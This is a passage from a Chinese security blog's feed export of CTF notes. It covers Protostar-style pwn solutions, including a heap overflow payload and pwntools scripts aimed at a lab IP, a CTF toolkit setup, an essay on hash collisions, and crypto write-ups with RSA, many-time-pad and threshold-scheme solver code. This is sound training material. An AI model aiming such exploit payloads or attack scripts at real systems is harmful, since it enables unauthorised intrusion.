'a'*72+'\x64\x84\x04\x08'"`data is at 0x804a008, fp is at 0x804a050level passed Heap 1Net 012345678from pwn import *r = remote("192.168.116.137", 2999)s = r.recv()pos = s.find("\'", 13)num = int(s[13:pos])r.sendline(p32(num))print r.recv() Net 112345678910from pwn import *import structr = remote("192.168.116.137", 2998)s = r.recv()# print snum = struct.unpack("I", s)# print numr.sendline(str(num[0]))print r.recv() Net 21234567891011from pwn import *import structr = remote("192.168.116.137", 2997)num = 0for i in range(0, 4): s = r.recv(4) num += int(struct.unpack("&lt;I", s)[0])num &amp;= 0xffffffffr.sendline(p32(num))print r.recv()]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>WARGAME</tag>
        <tag>PWN</tag>
        <tag>stackoverflow</tag>
        <tag>formatstring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在pip连不上网的时候安装pwntools]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%9C%A8pip%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85pwntools%2F</url>
    <content type="text"><![CDATA[本文描述了这样一种特殊情况下安装pwntools的解决方案：有方法联网，但是pip连不上网。 解决方法很简单，就是将pwntools和其依赖包下载下来，然后手动安装。选择对应版本，有whl直接下载whl，没有就下载源代码用命令python setup install安装，安装的时候可能会遇到有预先依赖，那就先安装依赖的包就行。 下图是我在2018年7月22日下载的一套，有需要的度盘链接：https://pan.baidu.com/s/1efC82WX_TdAMoS7aVBFi1w 密码：lnv8 安装效果如下图]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF用环境搭建]]></title>
    <url>%2F2018%2F07%2F20%2FCTF%E7%94%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[目前工具集合安装式这里的话就是那种安装以后直接用的，也有的是插件 86架构及基本库 pwndbg r2 非安装式这里的是不用/不能安装的库，比如脚本等 统一放置在/opt/目录下，可能根据类别再分 rsatool Python库 pwntools gmpy2 unicorn zio angr 正文安装式86架构及其个别基本库12345dpkg --add-architecture i386 apt-get updateapt-get -f dist-upgrade apt-get updateapt-get install lib32c-dev lib32stdc++6 pwndbg123git clone https://github.com/pwndbg/pwndbg /opt/pwndbgcd /opt/pwndbg./setup.sh 如果对pip无法用的时候怎么安装感兴趣，可以戳这里 r2123git clone https://github.com/radare/radare2.git /opt/r2cd /opt/r2/sys/install.sh 非安装式 工具 指令 备注 rsatool git clone https://github.com/ius/rsatool.git /opt/Crypto/rsatool Python库默认在pip能用的情况下，默认为python2.7，其他版本会备注 工具 指令 备注 pwntools pip install pwntools gmpy2 apt-get install python-gmpy2 zio pip install termcolor zio angr pip install angr unicorn pip install unicorn pwntools自带，但是不妨碍你只安装它]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于散列函数的一点思考]]></title>
    <url>%2F2018%2F06%2F03%2F%E5%85%B3%E4%BA%8E%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[今天在ACM群灌水的时候因为一个题目引发了一些思考，题目是比赛链接的A题 其实题目很明显，3e4的字符串总量，1e3的字符串长度上限，样例就显示了有字母、数字、符号，就10M内存，用字典树妥妥炸了。 所以就哈希呗。 幸运的是STL里就有自带的hash函数，于是就水过去了。 1234567891011121314151617#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; ios::sync_with_stdio(0); set&lt;long long&gt; m; hash&lt;string&gt; h; int n; string temp; cin&gt;&gt;n; while(n--)&#123; cin&gt;&gt;temp; m.insert(h(temp)); &#125; cout&lt;&lt;m.size()&lt;&lt;endl; return 0;&#125; 因为其实3e4这个字符串数量还是比较大的，在群里聊起了碰撞的问题，然后发现还是有丶东西，索性写一篇博文分析一下。 散列函数简介散列函数，也称哈希函数，是一种将任意大小数据映射到固定长度数字的单向函数。 散列函数常见于密码学的目的，随着密码学渗透到计算机的方方面面，因为其一些有用的特性也被用于ACM竞赛中。 通常来说，好的散列函数拥有以下几个特性： 确定性。固定输入对应的散列值是固定的。 分布均一。优秀的散列函数会使得所有值可能出现的概率尽量一致，这也导出了后面引出的一些特性。 值域固定。比如std::hash的值域为size_t的可表示范围，SHA-1的值域为$[0,2^{160}-1]$。 于是，用于密码学的散列函数经常有以下的特性： 单向性。这里有两个含义，一方面来说既然任意大小的数据都被映射到固定范围的一些值上，那么必然是一个多对一的关系，这就是第一个单向的原因；第二个原因则是函数本身的算法经常会保证无法通过散列值计算原始数据可能的集合。 雪崩效应。一个比特的改变，可能就会引起值的大幅度变化（按CryptoExchane的说法，是一半以上的比特）。这样就很难通过碰撞发起攻击了。 抗碰撞性。这里具体又分为两种，一种为抗弱碰撞性，另一种为抗强碰撞性，分别对应第二原像攻击和碰撞攻击。 抗弱碰撞性。指对于某散列函数$H()$与任意给定的$x$，找到$y≠x$且$H(x)=H(y)$在计算上不可行。 抗强碰撞性。值对于某散列函数$H()$而言，找到$H(x)=H(y)$且$x≠y$这样的数对在计算上不可行。 公开性。为了鉴别需求，常见的散列函数算法公开，这样任何能够编程的人都可以自己编程验证散列值。 ACM中的散列函数这里毕竟一个是我也退役了，没碰ACM有些时日，另一个我打ACM时也没有学得很深，所以这里的举例只能拿我们讲课的课件来粗糙地分析一下了，如果有误欢迎指出。 顺便ACM这比赛打过的同学就知道，不可能真写一个类似MD5这样的散列函数，ACM中的散列函数我通常用一句话概括：“又不是不能用。” 对于ACM当然是够用的，用其他地方就，再商量吧~ 直接模余法首先对于整数来说，最简单的方式就是模余法了，这也是很多题目处理大数的方式。模余法要尽量模上一个素数，这样会使得冲突的可能性降低。 但是选手在写题的时候通常不会直接模余，因为即便这样冲突降低，但是依然不小，而且会后续规避这样冲突的处理操作并不是很舒服。 转换(模余)法这里请看这个例题(HDOJ-1496 Equations) 题意简单，就类似“百钱买百鸡”问题。 但是如果直接暴力地四重循环，那可就很嗨了……虽说一般一秒做$10^8$简单计算的确可以，但是这题的数据的确就是在超时的边缘。 正确的做法就是预处理两个变量所有可能对应值的相反数，然后进行查找。 但是如果直接搞，那就需要开$2×10^7$大小的数组，不仅在MLE的边缘，而且还有初始化TLE的风险。 所以这里就可以用散列了。具体讨论见这里 同样的，对于一个纯字母的字符串来说，也可以进行这样的转换。就是将一个字符串视为二十六进制的数字，然后求这个数字的十进制值，因为可能会溢出，就模上一个素数如$1000000007$这样的。 字符串HASH——ELFHASH这里直接放它的代码吧，十分简短。 12345678910111213141516171819202122// ELF Hash Function unsigned int ELFHash(char *str) &#123; unsigned int hash = 0; unsigned int x = 0; while (*str) &#123; hash = (hash &lt;&lt; 4) + (*str++);//hash左移4位，把当前字符ASCII存入hash低四位。 if ((x = hash &amp; 0xF0000000L) != 0) &#123; //如果最高的四位不为0，则说明字符多余7个，现在正在存第7个字符，如果不处理，再加下一个字符时，第一个字符会被移出，因此要有如下处理。 //该处理，如果最高位为0，就会仅仅影响5-8位，否则会影响5-31位，因为C语言使用的算数移位 //因为1-4位刚刚存储了新加入到字符，所以不能&gt;&gt;28 hash ^= (x &gt;&gt; 24); //上面这行代码并不会对X有影响，本身X和hash的高4位相同，下面这行代码&amp;~即对28-31(高4位)位清零。 hash &amp;= ~x; &#125; &#125; //返回一个符号位为0的数，即丢弃最高位，以免函数外产生影响。(我们可以考虑，如果只有字符，符号位不可能为负) return (hash &amp; 0x7FFFFFFF); &#125; 这个函数写起来十分简单。我把注释也复制过来了，就不多解释了。 散列值碰撞了，怎么办？扯了那么多前篇，终于到这篇博文真实目的了，不过估计会很短…… 既然是散列函数，就要面对这个问题，一旦发生碰撞，很多问题就出来了，这里就简单分析一下针对散列函数的几个攻击吧。同时也会分析一下在ACM中散列函数的一点使用方法。 穷举攻击对于一个理想的散列函数来说，既然满足了上面的几个特性，穷举攻击需要的次数应该就是$\frac{值域}{2}$。 给你一个懂事的微笑。 生日攻击现在我们就尝试攻击散列函数的强抗碰撞性。这里以std::hash为例。 基于散列函数的几个特性来说，我们得到值域内任意值的可能性都为$\frac1{2^{32}}$。那么，在计算不同的任意$n$个字符串候，这些散列值都不冲突的可能性就是$\frac{2^{32}-1}{2^{32}}×\frac{2^{32}-2}{2^{32}}×…×\frac{2^{32}-n+1}{2^{32}}$。 对于题目给的数据，使用下面Python代码可以计算得不发生冲突的概率为$0.9005311337474664$即发生错误的可能性为$0.0994688662525336$。 12345678# a.pya = 1 &lt;&lt; 32s = 1for i in range(0, 30000): s *= (a-i)/aprint(s)#python a.py#0.9005311337474664 可见这个数字对于脸白的人来说是够了的。 教练我脸黑——多重散列函数那么我们就要考虑找路子了，这里又有两条分支了： 既然一个散列函数不行，那我就再来一个。之前是把字母字符串视为二十六进制数，那我就加个ELFHASH。这样做的好处是发生冲突的可能性稳定下降（变为两者发生冲突的乘积），坏处是编码难度上升。 加盐，加不同的盐值。但是这里要求散列函数是对块进行操作的。 加盐，可以简单理解为在字符串前/后面加上一个字符串，这样就可以使散列值发生变化。 对散列函数的要求是显而易见的，因为不论是二十六进制还是ELFHASH，只要之前字符串的散列值是同一个，那么在加盐后结果也不会发生改变。（块的大小对这里也会有影响，这里留给读者自行考虑） 对于GCC的std::hash来说，它用的是$MurmurHash Unaligned 2$，是一个分块大小为4的非密码学散列函数。 考虑理想状况，我们将多个盐值对应的不同散列值作为比对的标准，我们就能在一定程度上解决冲突，这里又能分出两条线。 将不同散列值放在不同容器里考虑这样的比对算法 12345678910111213141516//There is a bunch of set containers named s[0]/s[1]/etcstring str;cin &gt;&gt;str;temp = hash(str)if(!s[0].count(temp))&#123; s[0].insert(temp) count++&#125;else&#123; temp = hash(str+"salt1") if(!s[1].count(temp))&#123; s[1].insert(temp) count++ &#125;else&#123; //etc &#125;&#125; 那么可能会发生这样的问题，就是字符串s在第一次比对时和a串冲突，在第二次比对时又和b串冲突。 易知对于固定数量$n$的生日攻击来说，不发生冲突的概率$p$是一定的，假设多重散列函数就像我们所想的一样工作，那么该实验可以认为是一个成功率为$1-p$的伯努利实验。 在$m$重散列函数的情况下，均发生冲突的可能性是$P_0(m)=C_m^0(1-p)^m$，取这次题目的数据来说，两重散列函数发生冲突的概率为$0.009894055353564416$。 将各散列值包装成一个整体也就是说算法改为 1234567891011121314struct hashv&#123; size_t v[2];&#125;;set&lt;hashv&gt; s;string str;cin&gt;&gt;str;hashv temptemp.v[0] = hash(str)temp.v[1] = hash(str+"salt")if(!s.count(temp))&#123; s.insert(temp); count++;&#125; 理想状态下，此时发生单次冲突的概率为两次散列均冲突的概率，即两者的乘积，也就是$2^{64}-2^{33}+1$ 利用以下python代码计算得在题设情况下，不发生冲突的可能性为$0.9999999999999999999971601954045129840219384586382661991347799758614026869784477630643202473665079505271849114917935938025327598810920608449$ ，太强辣！ 1234567891011from decimal import *a = 1 &lt;&lt; 64 - 1&lt;&lt;33 +1a = Decimal(str(a))print(a)s = Decimal("1")getcontext().prec = 2000for i in range(0, 30000): if not i% 1000: print(i) s *= (a-Decimal(str(i)))/aprint(s) 可以发现，这样做以后是几何倍数降低发生碰撞的可能性了。 那么只有一个考虑了，就是这个结构体打算怎么写，不过这个问题就不是我操心的啦~ 后记思考使我快乐，即便这篇文章很水嘻嘻嘻 睡觉去啦~]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFCTF-Crypto_OfficialWriteUp]]></title>
    <url>%2F2018%2F05%2F21%2FAFCTF-Crypto-OfficialWriteUp%2F</url>
    <content type="text"><![CDATA[最后四个题没人做出来 题目丢到了github，欢迎来玩~ https://github.com/CSUwangj/AFCTF2018-Crypto 简单题Morse解题思路摩尔斯电码转字符，观察会发现是十六进制数，转ASCII码得flag flagafctf{1s&#39;t_s0_345y} BASE解题思路现在放出加密代码 123456789101112131415161718192021import base64import randomimport osimport syswith open('flag.txt', 'r') as file: flag = bytes(file.read(),'ascii') file.close()for i in range(0, 30): print(i) a = random.randint(0, 2) if a == 2: flag = base64.b64encode(flag) elif a == 1: flag = base64.b32encode(flag) else: flag = base64.b16encode(flag)with open('flag_encode.txt', 'w') as file: file.write(str(flag)[2:-1]) file.close() 这个问题的关键在于，经过30重加密的文件不可能会小，直接用文本编辑器打开的都完蛋啦。正确姿势是使用十六进制编辑器或者word打开，或者用程序读入一部分后查看内容。 此外根据题目可以大抵知道这是Base编码。 解密代码如下，可以在出题人博客找到主要部分 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: utf-8 -*-# Python3# Solution.pyfrom base64 import *s = ""with open('flag_encode.txt', 'r') as file: s = bytes(file.read(),'ascii') file.close()lis1 = [s]lis2 = []lis3 = []lis4 = []while(1): for a in lis1: ok = 0 try: lis2.append(b64decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b32decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b16decode(a).decode('ascii')) ok = 1 except: pass if not ok: lis3.append(a) if not len(lis2): break lis1=lis2.copy() lis2.clear()for a in range(0,len(lis3)): ok = 1 for b in lis3[a]: if ord(b)&gt;126 or ord(b)&lt;32: ok = 0 break if ok: lis4.append(lis3[a])print(lis4) flagafctf{U_5h0u1d_Us3_T00l5} MagicNum解题思路这个题可能有点脑洞的成分了，结果导致做出来的人很少。其实提示已经很明显了。 加密代码如下： 12345678910#include &lt;stdio.h&gt;char flag[]="afctf&#123;sec_is_everywhere&#125;";int main()&#123; for(int i=0;i&lt;6;++i)&#123; printf("%20f\n",*(float*)(flag+i*4)); &#125; return 0;&#125; flagafctf{sec_is_everywhere} Single解题思路这是古典密码学中经典的加密方式，单表替换。将a-z映射到a-z排列。 虽然密钥空间达到了 $26!$ 但是可以被频率分析很轻松地解决。 此外为了降低难度，让新人也能靠自己体验一把解密的感觉，将flag以原样放了进去，并且放出了加密代码，即便不了解频率分析也可以手动推算出来。 工具的话用https://quipqiup.com/，可以秒解 flagafctf{Oh_U_found_it_nice_tRy} 非预期解C++标准库里的random_shuffle十分腊鸡……以至于我只放出加密代码的情况下，在另一台机器另一个编译器上……运行得到的结果是一样的……导致直接用加密代码改改就出flag的愚蠢情况…… 出题人表示背锅，并下次手写随机数生成来解决。 Vigenère解题思路多表替换，密钥是csuwangjiang 因为我的昵称和大学都是可见信息，所以又算脑洞了？ 用工具可以秒解，随便放几个吧。 一个维吉尼亚： Vigenère and Gronsfeld Cipher 另一个维吉尼亚：https://atomcated.github.io/Vigenere/ 另一个维吉尼亚：http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx 另一个维吉尼亚：https://f00l.de/hacking/vigenere.php 具体原理就还是频率分析、常见词的替换，比如中间那句可以推测是flag is afctf{....} flagafctf{Whooooooo_U_Gotcha!} 你能看出这是什么加密么？解题思路裸RSA 12345678910111213141516171819!/usr/bin/pythonimport libnump=int('0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f',16)q=int('0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061',16)e=int('0x10001', 16)c=int('0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6',16)n=p*qphi=(p-1)*(q-1)d = libnum.modular.invmod(e, phi)print libnum.n2s(pow(c, d, n)) flagafctf{R54_|5_$0_$imp13} 可怜的RSA解题思路 用OpenSSL查看公钥，尝试将其分解成私钥 1openssl rsa -noout -text -inform PEM -in public.key -pubin 将十六进制转为十进制 1python -c &quot;print int(&apos;25b18bf5f389097d17237866bb51cff8de922453749ebc403b0995c97c0e386d46c161cadff77c69860dae4791c214cf8487aaaa9f26e920a977834906038aefb5c30827dfcf3fc9e9769544f94e07cdfe0872039a3a6262116678b261fb2d6b9d32539e92a153b3675629bab3942e7d35e30f7eef5abf1c50d797d0cc88e1bdccfd1a12ea6f7ef75c3727dbdf2e780f3428ae8f7a4fb7a89f184a365032b153f8425e845750eb2b7abc02dc15ce0207507aa950863bb8480a78028dd62979944d6c633fafa103e4db28ce87f5a0c6ed4a2f2664427f565c7781ab6191456d971c7ffa395272374cec0155e5f91189db742e4c28b03a0fa11cffb03173d2a4cce6ae53&apos;, 16)&quot; 用网站对其分解（http://www.factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443） 得到p、q 然后用rsatool生成私钥，发现flag.enc还经过base64加密，所以最后 123456789101112def decrypt_RSA(privkey, message): from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from base64 import b64decode key = open(privkey, "r").read() rsakey = RSA.importKey(key) rsakey = PKCS1_OAEP.new(rsakey) decrypted = rsakey.decrypt(b64decode(message)) return decrypted flag = "GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA=="print decrypt_RSA('priv.key', flag) flagafctf{R54_|5_$0_B0rin9} One Secret, Two encryption解题思路素数复用，求gcd即可得到一个素数，随便求一对，然后解密得到flag flagflag is afctf{You_Know_0p3u55I} 中等题Tiny LFSR解题思路LFSR的下一位只由当前决定，通过一对明文密文异或获得初始密钥，然后进行解密即可 flagafctf{read_is_hard_but_worthy} MyOwnCBC解题思路读了代码应该知道，其实并不是CBC而是愚蠢的自创加密模式，使用上一步的密文作为新一步的密钥。 所以直接读密文然后解密就行，flag也放在了末尾。 flagafctf{Don&#39;t_be_fooled_by_yourself} 中难题你听过一次一密么？解题思路Many-Time-Pad了解一下？ 按这个名词去谷歌能搜到很多分析 解密代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1='25030206463d3d393131555f7f1d061d4052111a19544e2e5d'c2='0f020606150f203f307f5c0a7f24070747130e16545000035d'c3='1203075429152a7020365c167f390f1013170b1006481e1314'c4='0f4610170e1e2235787f7853372c0f065752111b15454e0e09'c5='081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'c6='0909075412132e247436425332281a1c561f04071d520f0b11'c7='4116111b101e2170203011113a69001b475206011552050219'c8='041006064612297020375453342c17545a01451811411a470e'c9='021311114a5b0335207f7c167f22001b44520c15544801125d'c10='06140611460c26243c7f5c167f3d015446010053005907145d'c11='0f05110d160f263f3a7f4210372c03111313090415481d49'ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack#target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): # To store the final key final_key = [None]*150 # To store the positions we know are broken known_key_positions = set() # For each ciphertext for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don't xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode('hex'), ciphertext2.decode('hex'))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode('hex'),' '*150) for index in knownSpaceIndexes: # Store the key's value at the correct position final_key[index] = xor_with_spaces[index].encode('hex') # Record that we known the key at this position known_key_positions.add(index) # Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string) final_key_hex = ''.join([val if val is not None else '00' for val in final_key]) # Xor the currently known key with the target cipher output = strxor(target_cipher.decode('hex'),final_key_hex.decode('hex')) print "Fix this sentence:" print ''.join([char if index in known_key_positions else '*' for index, char in enumerate(output)])+"\n" # WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet # fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a" # if is too hard, change the target_cipher to another one and try again # and we have our key to fix the entire text! #sys.exit(0) #comment and continue if u got a good key target_plaintext = "cure, Let Me know if you a" print "Fixed:" print target_plaintext+"\n" key = strxor(target_cipher.decode('hex'),target_plaintext) print "Decrypted msg:" for cipher in ciphers: print strxor(cipher.decode('hex'),key) print "\nPrivate key recovered: "+key+"\n" for i in ciphers: target_fix(i) flagafctf{OPT_1s_Int3rest1ng} 花开藏宝地解题思路题目里的藏宝图 + 题面里提到只要集3份就能解密-&gt;门限方案 花开-&gt;bloom门限方案 也是一次尝试吧，尝试除了加密与编码外的考点 secret1 生日字典/脑洞 19260817 secret2 小写爆破 alice secret3 大写爆破 AVADA secret4 伪加密 secret5 NTFS隐写 任意取得三份后用bloom门限方案解，素数为题面的数字 代码（取1/2/3）： 1234567891011121314151617181920a1 =163305039963008322700958678938420655039108584848594236473036556130206292229761961459635355105529119955950769119000647821166302409987726181456624233820238004130596582552143052085826562771938653314722288583956794740182869336927141053110739981290237894112152720822014240230972011848683576402535994825309029822761855623903611335752059666683377536920052428648302389426609672118522003510398578217d1 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413a2 =151758100093328024755534362157152644916689556800407091638077262152051356374687426002691308331360911658681675621180784078464300557713597658668737755275578303683512763651424490696663046659762209459401095803407234074793144034799798937463085989364658809489473016814564284374253047111285307568938011571482613761721746338619879940928380741377367381517427341679641871126076991209176935339058909863d2 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553a3 = 346077592068259399350080379767941982003794373736058097723728104020814800897686828693026215723695173898771936691822530717642440410239211631306801809213192374695040232378965389612021366734818648007275332322621064659199680848745242700755440206949465953441277866419617961232234201083716216031999849609543380477085554544227121956015035672626500140341901966363694497881768843758979050832435224875d3 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351dd = d1*d2*d3t1 = pow(dd//d1,d1-2,d1)assert(t1*d2*d3%d1 == 1)t2 = pow(dd//d2,d2-2,d2)assert(t2*d1*d3%d2 == 1)t3 = pow(dd//d3,d3-2,d3)assert(t3*d2*d1%d3 == 1)s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2p = 80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857s %= ddprint(s)s %= pprint(s) 最后结果转HEX转ASCII即可 题目生成代码有需要的邮件我叭 flagafctf{1sn&#39;t_s0_int3Resting} 非预期解后来发现自己又犯蠢了。。。 因为选的素数……是用nextprime()选的，所以相差……不大…… 你可以直接把那个素数转成字符串……和明文只有……最后一个字符不一样…… ZZ点数 + 10 一道有趣的题目解题思路这道题来自dctf2015 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#求出加密的比特位def decrypt(cipherText): guessed_bits = ['?'] * len(cipherText) length = len(cipherText) i = 0 orded_cipher = [ord(c) &amp; 1 for c in cipherText] decrypt_r(orded_cipher, guessed_bits, i, length, 10)def try_guess(orded_cipher, guessedbits, i, length, guess, space): guessedbits = list(guessedbits) guessedbits[i] = guess if i + space &lt; length - 1: nextndx = i + space else: nextndx = space nextbit = orded_cipher[i] ^ guess if guess == 0: newspace = space + 1 else: newspace = space - 1 if guessedbits[nextndx] == '?' or guessedbits[nextndx] == nextbit: guessedbits[nextndx] = nextbit decrypt_r(orded_cipher, guessedbits, i + 1, length, newspace)def decrypt_r(orded_cipher, guessedbits, i, length, space): if i &gt;= length: print 'ok:', ''.join(str(c) for c in guessedbits) return if guessedbits[i] == '?': try_guess(orded_cipher, guessedbits, i, length, 0, space) try_guess(orded_cipher, guessedbits, i, length, 1, space) elif guessedbits[i] == 0: try_guess(orded_cipher, guessedbits, i, length, 0, space) elif guessedbits[i] == 1: try_guess(orded_cipher, guessedbits, i, length, 1, space) #print ''.join(str(c) for c in guessedbits)s='15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206'#print len(s)s=s.decode('hex')#print len(s)decrypt(s)#求出明文sln='1010011010010101111111101001'ciph=sprint slnimport stringslv = [None] * len(sln)def filling_pass(slv): while True: any = False space = 10 for i in range(len(sln)): if i + space &lt; len(sln) - 1: nx = i + space else: nx = space if sln[i] == '0': space += 1 else: space -= 1 if slv[i] is not None: sn = ord(slv[i]) ^ ord(ciph[i]) if slv[nx] is None: slv[nx] = chr(sn) if (sn &gt;= 32 and sn &lt; 127) or sn == 10 or sn == 13: any = True else: return False else: if slv[nx] != chr(sn): return False if not any: return Truedef tryit(slvo, start): while slvo[start] is not None: start += 1 if start &gt;= len(slvo): print ''.join(' ' if c is None else '.' if ord(c) &lt; 32 else c for c in slvo) return continue for c in string.printable: slv = list(slvo) slv[start] = c possible = filling_pass(slv) if possible: tryit(slv, start)print tryit(slv, 0) flagafctf{cryptanalysis_is_hard} 难题Fast LFSR解题思路使用LFSR生成流密钥，具体名称是Geffe Generator 攻击方式是快速相关攻击（Fast Correlation Attack） 原题出自强网杯StreamGame3，出题的时候还搜不到可用的WP 具体请查看论文以及网上WP如这篇 flagafctf{01abcd056789123456}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-WP合集]]></title>
    <url>%2F2018%2F05%2F10%2FJarvisOJ-WP%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[因为预感进度表会很长，所以不放了 不资瓷跳转的进度表 Basic base64 关于USS Lab. veryeasy 段子 手贱 美丽的实验室logo 神秘的文件 公倍数 Easy Crackme Secret 爱吃培根的出题人 Easy RSA ROPGadget 取证 熟悉的声音 Baby’s Crack Help!! Shellcode A Piece Of Cake -.-字符串 德军的密码 握手包 Crypto Medium RSA BrokenPic hard RSA [Ｘ] Basic[Ｘ] base64注意到没有小写字母和大点的数字，猜测是base32，解完以后是一个十六进制字符串，转ASCII解得 flagPCTF{Just_t3st_h4v3_f4n} [Ｘ] 关于USS Lab.搜索得到答案，注意题目里说的是USS Lab。 顺便其实点开about就能看到全称（233 flagPCTF{ubiquitous_system_security} [Ｘ] veryeasy打开文件我就知道要用strings命令，但是我就不，我就翻 flagPCTF{strings_i5_3asy_isnt_i7} [Ｘ] 段子将锟斤拷存ANSI编码，然后HEX编辑器打开就好 flagPCTF{EFBFBDEFBFBD} [Ｘ] 手贱直接解MD5，然后发现说不是标准MD5值，发现长度为33 再看看具体的，发现里面有个$L$的小写，删了解MD5得flag flagPCTF{hack} [Ｘ] 美丽的实验室logobinwalk没有额外东西 但是可以发现不是裸的jpg，strings可以看到Adobe公司工具编辑的痕迹，回去继续 不对，用Stegsolver的Frame Browser看到了flag flagPCTF{You_are_R3ally_Car3ful} [Ｘ] veryeasyRSARSA-tool直接上啦~ flagPCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369} [Ｘ] 